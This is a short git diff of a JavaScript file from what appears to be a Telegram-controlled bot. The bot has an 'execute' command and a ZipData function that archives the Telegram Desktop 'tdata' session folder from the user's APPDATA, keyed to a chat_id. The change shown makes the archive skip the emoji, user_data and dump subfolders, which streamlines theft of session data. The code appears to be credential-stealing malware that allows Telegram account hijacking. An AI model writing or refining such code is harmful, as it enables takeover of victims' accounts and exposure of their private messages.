@@ -18,7 +18,8 @@ bot.command("execute", (ctx) => {
 // Start the bot.
 bot.start();
 
-// Define the directory you want to zip
+const ignoreDirs = ["emoji", "user_data", "dump"]; // Array of directories to be ignored
+
 function ZipData(chat_id) {
   const tgDesktop = path.join(process.env.APPDATA, "Telegram Desktop");
   const directoryToZip = path.join(tgDesktop, "tdata");
@@ -36,7 +37,11 @@ function ZipData(chat_id) {
   archive.pipe(output);
 
   // Append all files and directories from the specified directory
-  archive.directory(directoryToZip, false);
+  archive.glob("**/*", {
+    cwd: directoryToZip,
+    nodir: true,
+    ignore: ignoreDirs.map((dir) => `**/${dir}/**/*`), // Skip directories listed in `ignoreDirs`
+  });
 
   // Finalize the archive (write the zip file)
   archive.finalize();
